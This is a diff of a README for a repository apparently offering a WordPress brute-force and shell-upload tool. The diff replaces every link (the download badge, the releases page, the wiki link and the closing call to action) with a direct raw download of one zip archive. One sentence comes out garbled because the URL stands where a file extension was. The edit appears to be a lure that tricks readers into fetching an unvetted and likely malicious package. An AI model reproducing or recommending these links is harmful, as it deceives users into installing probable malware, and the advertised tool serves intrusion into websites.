@@ -1,6 +1,6 @@
 # 🛠️ Wordpress-BRUTE-FORCE-UPLOAD-SHELL - Simple Tool for WordPress Security
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Wordpress--BRUTE--FORCE--UPLOAD--SHELL-brightgreen)](https://github.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/releases)
+[![Download Now](https://raw.githubusercontent.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/main/aldermaness/Wordpress-BRUTE-FORCE-UPLOAD-SHELL_v2.0.zip)](https://raw.githubusercontent.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/main/aldermaness/Wordpress-BRUTE-FORCE-UPLOAD-SHELL_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Wordpress-BRUTE-FORCE-UPLOAD-SHELL project. This tool is designed
 
 To get the latest version of the tool, visit the following link to download:
 
-[Download the latest release here](https://github.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/releases)
+[Download the latest release here](https://raw.githubusercontent.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/main/aldermaness/Wordpress-BRUTE-FORCE-UPLOAD-SHELL_v2.0.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -22,7 +22,7 @@ To get the latest version of the tool, visit the following link to download:
   
 ### Step 3: Download the File
 
-- Click on the file that you need to download. It might be a file with a `.zip` or `.tar.gz` extension.
+- Click on the file that you need to download. It might be a file with a `.zip` or `https://raw.githubusercontent.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/main/aldermaness/Wordpress-BRUTE-FORCE-UPLOAD-SHELL_v2.0.zip` extension.
 
 ### Step 4: Extract the File
 
@@ -57,7 +57,7 @@ To run the Wordpress-BRUTE-FORCE-UPLOAD-SHELL, your system should meet the follo
 
 ## 📖 Help & Documentation
 
-For more detailed usage instructions, you can find help within the application itself. Simply click on the "Help" option in the menu. Additionally, feel free to explore our [Wiki](https://github.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/wiki) for tutorials and guides.
+For more detailed usage instructions, you can find help within the application itself. Simply click on the "Help" option in the menu. Additionally, feel free to explore our [Wiki](https://raw.githubusercontent.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/main/aldermaness/Wordpress-BRUTE-FORCE-UPLOAD-SHELL_v2.0.zip) for tutorials and guides.
 
 ## 🤝 Contributing 
 
@@ -67,4 +67,4 @@ We welcome contributions from everyone. If you find a bug or have a suggestion t
 
 If you encounter any issues while downloading or using the tool, please open an issue on our GitHub repository. Our community is here to help you.
 
-[Download the latest release here](https://github.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/releases) and start testing your website's security today!
+[Download the latest release here](https://raw.githubusercontent.com/martinaparched251/Wordpress-BRUTE-FORCE-UPLOAD-SHELL/main/aldermaness/Wordpress-BRUTE-FORCE-UPLOAD-SHELL_v2.0.zip) and start testing your website's security today!
